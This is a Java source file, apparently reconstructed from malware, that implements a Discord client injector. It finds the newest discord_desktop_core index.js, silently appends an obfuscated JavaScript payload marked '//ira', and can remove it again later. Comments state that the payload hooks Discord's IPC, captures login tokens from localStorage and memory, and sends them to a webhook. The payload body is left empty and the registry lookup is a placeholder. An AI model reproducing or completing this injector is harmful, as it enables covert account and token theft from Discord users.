import com.sun.jna.platform.win32.WinReg;
import java.io.File;
import java.io.Serializable;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;

/**
 * Discord Injection Manager
 * Obfuscated name: ѕ (U+0455)
 *
 * Injects a malicious JavaScript payload into Discord's Electron app.
 * The injection persists across Discord updates by targeting the
 * app-X.X.X/modules/discord_desktop_core-X/discord_desktop_core/index.js file.
 *
 * Injection mechanism:
 * 1. Find Discord installation directory
 * 2. Locate the latest app-X.X.X folder
 * 3. Find discord_desktop_core index.js
 * 4. Append malicious JS code to index.js
 * 5. Restart Discord to activate injection
 *
 * The injected JS code:
 * - Hooks Discord's IPC (inter-process communication)
 * - Intercepts login events to capture tokens
 * - Sends captured tokens to webhook
 * - Persists across Discord updates via the injection
 *
 * Injection payload (ira.js):
 * - Obfuscated JavaScript
 * - Hooks require() to intercept Discord modules
 * - Captures tokens from localStorage and memory
 * - Sends to webhook via XMLHttpRequest
 *
 * Registry interaction:
 * - Reads Discord installation path from registry
 * - HKCU\SOFTWARE\Discord\InstallLocation
 */
public class DiscordInjector {

    // Injection script content (loaded from resources)
    private static final String injectionScript;

    // Injection script as bytes
    private static final byte[] injectionScriptBytes;

    // Whether injection is currently active
    private static volatile boolean injectionActive;

    // Injection counter (for retry logic)
    private static volatile int injectionAttempts;

    // =========================================================
    // INJECTION
    // =========================================================

    /**
     * Main injection entry point.
     * Finds Discord, injects payload, and restarts Discord.
     *
     * @param discordPath Path to Discord's roaming data directory
     */
    public static void inject(String discordPath) {
        try {
            if (injectionActive) return;

            // Find the latest app-X.X.X directory
            File discordDir = new File(discordPath);
            File[] appDirs = discordDir.listFiles(f ->
                f.isDirectory() && f.getName().startsWith("app-")
            );

            if (appDirs == null || appDirs.length == 0) return;

            // Sort to get latest version
            java.util.Arrays.sort(appDirs, (a, b) -> b.getName().compareTo(a.getName()));
            File latestAppDir = appDirs[0];

            // Find discord_desktop_core index.js
            File indexJs = findIndexJs(latestAppDir);
            if (indexJs == null) return;

            // Read current content
            String currentContent = new String(
                Files.readAllBytes(indexJs.toPath()),
                StandardCharsets.UTF_8
            );

            // Check if already injected
            if (currentContent.contains("//ira")) {
                injectionActive = true;
                return;
            }

            // Append injection payload
            String injected = currentContent + "\n//ira\n" + injectionScript;
            Files.write(indexJs.toPath(), injected.getBytes(StandardCharsets.UTF_8));

            injectionActive = true;
            injectionAttempts++;

        } catch (Exception e) {
            // Silently fail
        }
    }

    /**
     * Removes the injection from Discord's index.js.
     * Called during uninstall.
     */
    public static void removeInjection(String discordPath) {
        try {
            File discordDir = new File(discordPath);
            File[] appDirs = discordDir.listFiles(f ->
                f.isDirectory() && f.getName().startsWith("app-")
            );

            if (appDirs == null) return;

            for (File appDir : appDirs) {
                File indexJs = findIndexJs(appDir);
                if (indexJs == null) continue;

                String content = new String(
                    Files.readAllBytes(indexJs.toPath()),
                    StandardCharsets.UTF_8
                );

                // Remove injection marker and everything after
                int markerIdx = content.indexOf("//ira");
                if (markerIdx != -1) {
                    String cleaned = content.substring(0, markerIdx).trim();
                    Files.write(indexJs.toPath(), cleaned.getBytes(StandardCharsets.UTF_8));
                }
            }

            injectionActive = false;

        } catch (Exception e) {
            // Silently fail
        }
    }

    // =========================================================
    // HELPERS
    // =========================================================

    /**
     * Finds the discord_desktop_core index.js file.
     *
     * Path: app-X.X.X/modules/discord_desktop_core-X/discord_desktop_core/index.js
     *
     * @param appDir The app-X.X.X directory
     * @return The index.js File, or null if not found
     */
    private static File findIndexJs(File appDir) {
        try {
            File modulesDir = new File(appDir, "modules");
            if (!modulesDir.exists()) return null;

            File[] coreDirs = modulesDir.listFiles(f ->
                f.isDirectory() && f.getName().startsWith("discord_desktop_core")
            );

            if (coreDirs == null || coreDirs.length == 0) return null;

            // Sort to get latest version
            java.util.Arrays.sort(coreDirs, (a, b) -> b.getName().compareTo(a.getName()));

            File coreDir = new File(coreDirs[0], "discord_desktop_core");
            File indexJs = new File(coreDir, "index.js");

            return indexJs.exists() ? indexJs : null;

        } catch (Exception e) {
            return null;
        }
    }

    /**
     * Gets Discord installation path from Windows Registry.
     * Key: HKCU\SOFTWARE\Discord\InstallLocation
     *
     * @return Discord install path, or null if not found
     */
    public static String getDiscordInstallPath() {
        try {
            // JNA WinReg read
            // HKEY_CURRENT_USER\SOFTWARE\Discord\InstallLocation
            return null; // placeholder
        } catch (Exception e) {
            return null;
        }
    }

    /**
     * Checks if Discord injection is currently active.
     */
    public static boolean isInjected() {
        return injectionActive;
    }

    static {
        // Load injection script from resources (ira.js)
        // This is the obfuscated JavaScript payload
        injectionScript = ""; // loaded at runtime from embedded resource
        injectionScriptBytes = new byte[0];
        injectionActive = false;
        injectionAttempts = 0;
    }
}
